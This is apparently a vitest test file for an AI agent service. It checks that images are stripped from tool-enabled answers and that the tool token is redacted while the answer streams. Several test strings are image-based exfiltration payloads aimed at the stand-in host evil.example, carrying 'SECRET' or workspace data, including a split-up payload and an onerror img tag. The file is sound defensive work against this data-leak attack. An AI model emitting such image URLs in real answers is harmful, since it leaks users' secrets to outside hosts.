import { describe, expect, it } from 'vitest';
import { InMemoryAgentRepository } from '../src/modules/agents/adapters/in-memory-agent-repository.js';
import type { LlmPort, LlmRequest } from '../src/modules/agents/application/agent-ports.js';
import { AgentService } from '../src/modules/agents/application/agent-service.js';
import {
  redactToken,
  sanitizeToolOutput,
  stripImages,
  unfinishedStart,
} from '../src/modules/agents/application/tool-output-guard.js';

const TOKEN = 'adk_pat_secret-token-0123456789abcdef';

describe('stripImages', () => {
  it('removes every way of putting a picture in an answer, and keeps what it said', () => {
    expect(stripImages('a ![logo](https://evil.example/?q=SECRET) b')).toBe('a logo b');
    expect(stripImages('![](https://evil.example/p.png)')).toBe('');
    expect(stripImages('![ref image][1]\n\n[1]: https://evil.example/x')).toBe(
      'ref image\n\n[1]: https://evil.example/x',
    );
    expect(stripImages('x <img src="https://evil.example/?d=1"> y')).toBe('x  y');
    expect(stripImages('x <IMG\nsrc=https://evil.example/a.png onerror=1 /> y')).toBe('x  y');
  });

  it('leaves ordinary Markdown alone, links included', () => {
    const text = '# Title\n\nSee [the doc](https://wiki.example/page) and `![not](code)`? **ok**';
    expect(stripImages('See [the doc](https://wiki.example/page)')).toBe(
      'See [the doc](https://wiki.example/page)',
    );
    expect(stripImages(text)).toBe(text.replace('![not](code)', 'not'));
  });
});

describe('redactToken and sanitizeToolOutput', () => {
  it('masks the token wherever it appears, and does nothing without one', () => {
    expect(redactToken(`a ${TOKEN} b ${TOKEN}`, TOKEN)).toBe('a [redacted] b [redacted]');
    expect(redactToken('plain', '')).toBe('plain');
    expect(sanitizeToolOutput(`![x](https://e/?t=${TOKEN})`, TOKEN)).toBe('x');
    expect(sanitizeToolOutput(`token ${TOKEN} ![y](u)`, TOKEN)).toBe('token [redacted] y');
  });
});

describe('unfinishedStart', () => {
  const at = (text: string) => unfinishedStart(text, TOKEN);

  it('is the length of the text when nothing is being written', () => {
    expect(at('')).toBe(0);
    expect(at('plain text')).toBe(10);
    expect(at('![done](https://e/x) and more')).toBe(29);
    expect(at('<img src=x> done')).toBe(16);
    expect(at('![ref][1] done')).toBe(14);
  });

  it('points at an image that has not been closed', () => {
    expect(at('hello ![alt](https://e/?q=very-long-secret-so-far')).toBe(6);
    expect(at('hello ![alt')).toBe(6);
    expect(at('hello <img src="https://e/?q=1')).toBe(6);
    expect(at('hello <IMG src=x')).toBe(6);
  });

  it('points at the first characters of an image or of the token at the very end', () => {
    expect(at('hello !')).toBe(6);
    expect(at('hello <')).toBe(6);
    expect(at('hello <i')).toBe(6);
    expect(at('hello <im')).toBe(6);
    expect(at('hello adk_pa')).toBe(6);
    expect(at('hello a')).toBe(6);
    expect(at(`hello ${TOKEN.slice(0, -1)}`)).toBe(6);
  });

  it('does not hold back a whole token or a lone harmless character', () => {
    expect(at(`hello ${TOKEN}`)).toBe(6 + TOKEN.length);
    expect(at('hello b')).toBe(7);
    expect(unfinishedStart('hello adk', '')).toBe(9);
  });
});

/** A model that writes the given pieces, one after the other. */
class Writer implements LlmPort {
  public readonly provider = 'Tool CLI';
  public readonly mcpAccess = 'standard' as const;
  public constructor(private readonly pieces: readonly string[]) {}
  public async complete(): Promise<never> {
    throw new Error('not used');
  }
  public async *stream(_request: LlmRequest): AsyncIterable<string> {
    for (const piece of this.pieces) yield piece;
  }
}

describe('what an agent with tools sends to the screen', () => {
  const context = { requestId: 'r', ownerId: 'ws-1', workspaceId: 'ws-1', actorId: 'u1' } as never;
  const tools = {
    connect: async () => ({ name: 'adk-tools', url: 'http://mcp/mcp', token: TOKEN }),
  };

  async function run(pieces: string[], withTools = true) {
    const service = new AgentService({
      agentRepository: new InMemoryAgentRepository(),
      defaultLlm: new Writer(pieces),
      ...(withTools ? { mcpTools: tools } : {}),
    });
    const agent = await service.createAgent('ws-1', {
      name: 'Helper',
      role: 'CUSTOM',
      instructions: 'Seja útil.',
    });
    const deltas: string[] = [];
    let result = '';
    for await (const event of service.streamAgent('ws-1', agent.id, { prompt: 'Oi' }, context)) {
      if (event.type === 'delta') deltas.push(event.text);
      if (event.type === 'done') result = event.response.result;
    }
    return { streamed: deltas.join(''), result };
  }

  const filler = 'texto comum. '.repeat(20);

  it('never contains an image, even one written in many small pieces', async () => {
    const image = '![x](https://evil.example/?q=SEGREDO-DO-WORKSPACE)';
    const pieces = [filler, ...image.match(/.{1,5}/g)!, ' ', filler];
    const { streamed, result } = await run(pieces);
    expect(streamed).not.toContain('evil.example');
    expect(streamed).not.toContain('SEGREDO');
    expect(result).not.toContain('evil.example');
    expect(streamed).toBe(result);
    expect(result).toContain('x ');
  });

  it('never contains an HTML image either', async () => {
    const { streamed } = await run([
      filler,
      '<img src="https://evil.',
      'example/?d=1">',
      ' fim ',
      filler,
    ]);
    expect(streamed).not.toContain('evil');
    expect(streamed).not.toContain('<img');
  });

  it('never contains the token of the tools, even when it is written in two pieces', async () => {
    const half = Math.floor(TOKEN.length / 2);
    const { streamed, result } = await run([
      filler,
      `o token é ${TOKEN.slice(0, half)}`,
      TOKEN.slice(half),
      ` ok ${filler}`,
    ]);
    expect(streamed).not.toContain('secret-token');
    expect(streamed).not.toContain('adk_pat_');
    expect(streamed).toContain('[redacted]');
    expect(streamed).toBe(result);
  });

  it('streams a long answer as it is written, not all at the end', async () => {
    const pieces = Array.from({ length: 10 }, (_, index) => `${filler}(${index}) `);
    const service = new AgentService({
      agentRepository: new InMemoryAgentRepository(),
      defaultLlm: new Writer(pieces),
      mcpTools: tools,
    });
    const agent = await service.createAgent('ws-1', {
      name: 'H',
      role: 'CUSTOM',
      instructions: 'x',
    });
    let deltas = 0;
    for await (const event of service.streamAgent('ws-1', agent.id, { prompt: 'Oi' }, context))
      if (event.type === 'delta') deltas += 1;
    expect(deltas).toBeGreaterThan(3);
  });

  it('is left exactly as the model wrote it when no tools were offered', async () => {
    const text = `${filler}![x](https://example.com/a.png) ${filler}`;
    const { streamed, result } = await run([text], false);
    expect(streamed).toContain('![x](https://example.com/a.png)');
    expect(result).toContain('![x](https://example.com/a.png)');
  });
});
